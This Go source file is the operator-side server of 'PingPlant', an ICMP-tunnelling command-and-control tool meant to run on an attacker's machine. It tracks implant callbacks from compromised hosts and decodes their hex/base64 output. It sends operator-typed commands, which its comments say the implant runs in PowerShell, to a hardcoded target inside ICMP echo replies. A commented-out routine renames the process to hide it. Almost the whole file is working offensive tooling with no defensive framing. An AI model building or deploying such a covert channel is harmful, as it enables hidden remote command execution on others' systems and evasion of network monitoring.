// This is the code for the listening server that will run on attackers machine
// Will wait for, parse, and send communications from targets via pingPlants

// TODO: Filter comms based on targets or only parse/output certain traffic
// TODO: Implement secret message for initial callback to add to a global targets map

package main

import (
	// Base Libs
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"net"
	"os"
	"strings"
	"bufio"

	// External Libs
	"github.com/AlecAivazis/survey/v2"
	"github.com/fatih/color"
	"github.com/manifoldco/promptui"
	"github.com/olekukonko/tablewriter"
	"github.com/rs/zerolog"
	"github.com/rs/zerolog/log"
	"github.com/satori/go.uuid"

	// Golang Libs
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// targetIP is the const variable of the IP to send data to
// TODO: Change to whatever agent you are interacting with
const targetIP = "192.168.230.132"

// To be used as an egg later
//const secretMessage = "Activate"

var activeAgent string
var conn *icmp.PacketConn
var listenErr error
var buf = make([]byte, 40000)

var Agents = make(map[uuid.UUID]*Agent)

// Agent is a server side structure that holds information about a PingPlant Agent
type Agent struct {
	ID       uuid.UUID
	Platform string
	UserName string
	HostName string
	Ip       string
	Pid      int
}

// validateOptions is a function that just helps check to make sure you're choosing a correct option
func validateOptions(slice []string, val string) bool {
	for _, item := range slice {
		if strings.EqualFold(item, val) {
			return true
		}
	}
	return false
}
func ReadData(packetData string, addr string) {
	//func ReadData(readbuf []byte, packetData int) {
	var firstCallback = true
	//src := readbuf[8:packetData]

	//hexToString := hex.EncodeToString(src)

	hexDecode, _ := hex.DecodeString(packetData)

	base64Text := make([]byte, base64.StdEncoding.DecodedLen(len(hexDecode)))

	decode, _ := base64.StdEncoding.Decode(base64Text, []byte(hexDecode))

	agentData := base64Text[:decode]

	// if data contains uuid
	initialUuid, inituuidErr := uuid.FromString(string(agentData))
	if inituuidErr != nil {
		firstCallback = false
	}
	if firstCallback {
		_, _ = NewAgentCallback(initialUuid, addr)
	} else {
		data := [][]string{
			{string(agentData)},
		}
		table := tablewriter.NewWriter(os.Stdout)
		table.SetHeader([]string{"Response"})

		table.SetAutoWrapText(false)
		table.SetBorder(false)
		table.SetHeaderLine(true)
		table.AppendBulk(data)
	
		fmt.Println()
		table.Render()
		color.Set(color.FgGreen)
		fmt.Printf("[%s] PingPlant >> ", activeAgent)
		color.Unset()
	}
	return

}

// isAgent enumerates a map of all instantiated agents and returns true if the provided agent UUID exists
func isAgent(agentID uuid.UUID) bool {
	for agent := range Agents {
		if Agents[agent].ID == agentID {
			return true
		}
	}
	return false
}

// PingListen is a function that handles the "server" portion of the implant
// Which will just listen for ICMP traffic, parse it, decode it, and then send it to a new powershell process
// in which it will then execute the command it received, encode it, and send it out
// Added a chunking portion that handles large data outputs
func PingListen() {

	conn, listenErr = icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if listenErr != nil {
		fmt.Println(listenErr)
	}
	defer conn.Close()

	for {
		n, addr, er := conn.ReadFrom(buf)
		if er != nil {
			fmt.Println(er)
		}
		sourceAddr := fmt.Sprintf("%v", addr)
		rm, err := icmp.ParseMessage(1, buf[:n])
		if err != nil {
			fmt.Println(err)
		}

		body, _ := rm.Body.Marshal(0)
		

		packetStr := fmt.Sprintf("%x", body)
		packetData := packetStr[8:]
		ReadData(packetData, sourceAddr)

	}
}

func NewAgentCallback(agentUUID uuid.UUID, agentAddr string) (Agent, error) {
	var agent Agent

	log.Info().Str("Agent ID", (agentUUID).String()).Str("Agent IP", agentAddr).Msg("New Agent Checked In!")
	if isAgent(agentUUID) {
		return agent, fmt.Errorf("the %s agent already exists", agentUUID)
	}

	agent.ID = agentUUID
	agent.Ip = agentAddr

	// Add agent to global map
	Agents[agentUUID] = &agent
	return agent, nil

}

func EncodeData(input string) string {
	data := base64.StdEncoding.EncodeToString([]byte(input))
	return data
}

func SendData(data string, seq int) {

	wm := icmp.Message{
		Type: ipv4.ICMPTypeEchoReply, Code: 0,
		Body: &icmp.Echo{
			ID: os.Getpid() & 0xffff, Seq: seq,
			Data: []byte(data),
		},
	}
	
	wb, err := wm.Marshal(nil)
	
	if err != nil {
		log.Fatal().AnErr("Marshal Error", err)
	}
	if _, err := conn.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
		log.Fatal().AnErr("WriteTo Error", err)
	}

}

func main() {
	log.Logger = log.Output(zerolog.ConsoleWriter{Out: os.Stderr})

	for {

		options := []string{"Listen", "Help", "List", "Interact", "Exit"}
		validate := func(input string) error {
			found := validateOptions(options, input)

			if !found {
				return errors.New("invalid option")
			}

			return nil
		}

		// Each template displays the data received from the prompt with some formatting.
		templates := &promptui.PromptTemplates{
			Prompt:  "{{ . }} ",
			Valid:   "{{ . | green }} ",
			Invalid: "{{ . | red }} ",
			Success: "{{ . | cyan }} ",
		}

		// Init Prompt
		prompt := promptui.Prompt{
			Label:     "PingPlant >>",
			Templates: templates,
			Validate:  validate,
		}

		// Result holds whatever you type into the prompt
		result, err := prompt.Run()

		if err != nil {
			fmt.Printf("Prompt failed %v\n", err)
			return
		}

		if strings.EqualFold(result, "Help") {
			fmt.Println("")
			fmt.Println(color.HiYellowString("[ Valid Commands ]		[ Description ]"))
			fmt.Println("------------------      	---------------") // Literally just aesthetic
			fmt.Println(" Help				Display this help menu")
			fmt.Println(" List				List all the previously checked in agents")
			fmt.Println(" Listen				Listen for new agent callbacks")
			fmt.Println(" Interact			Without any args, pull up a menu of agents to interact with")
			fmt.Println(" Exit				Quit")
			fmt.Println(" ")

		}

		if strings.EqualFold(result, "Listen") {
			go PingListen()
		}

		if strings.EqualFold(result, "List") {
			for agents := range Agents {
				fmt.Println(agents)
			}

		}

		if strings.EqualFold(result, "Exit") {
			os.Exit(0)
		}

		if strings.EqualFold(result, "Interact") {
			var agents []string
			for k := range Agents {
				agents = append(agents, k.String())
			}
			prompt := &survey.Select{
				Message: "Choose an agent to interact with:",
				Options: agents,
			}

			askErr := survey.AskOne(prompt, &activeAgent)
			if askErr != nil {
				fmt.Println(askErr)
				return
			}

			for {
				reader := bufio.NewReader(os.Stdin)
				color.Set(color.FgGreen)
				fmt.Printf("[%s] PingPlant >> ", activeAgent)
				color.Unset()
				text, _ := reader.ReadString('\n')
				text = strings.Replace(text, "\n", "", -1)
				text = strings.Replace(text, "\r", "", -1)

				// Check if operator typed "back" meaning to go back to the main menu
				if text == "back" {
					break
				}

				data := EncodeData(text)
				SendData(data, 3)

			}
		}

	}

}
//protocol := "icmp"
//
//netaddr, err := net.ResolveIPAddr("ip4", "0.0.0.0")
//if err != nil {
//	fmt.Printf("[-] Error in Resolve IPAddr: %s\n\n", err)
//}
//conn, err = net.ListenIP("ip4:"+protocol, netaddr)
//if err != nil {
//	fmt.Printf("[-] Error in ListenIP: %s\n\n", err)
//}

//packetData, err := conn.Read(buf)
//packetData, _, err := conn.ReadFrom(buf)
//if err != nil {
//	fmt.Printf("[+] Error reading packet data, %s\n\n", err)
//}
//log.Info().Int("PingListen", packetData)


		/*
	// ChangeProcName() is a function that hooks argv[0] and renames it
	// This will stand out to filesystem analysis such as lsof and the /proc directory
	func ChangeProcName(name string) error {
		argv0str := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0]))
		argv0 := (*[1 << 30]byte)(unsafe.Pointer(argv0str.Data))[:argv0str.Len]

		n := copy(argv0, name)
		if n < len(argv0) {
			argv0[n] = 0
		}

		return nil
	}
*/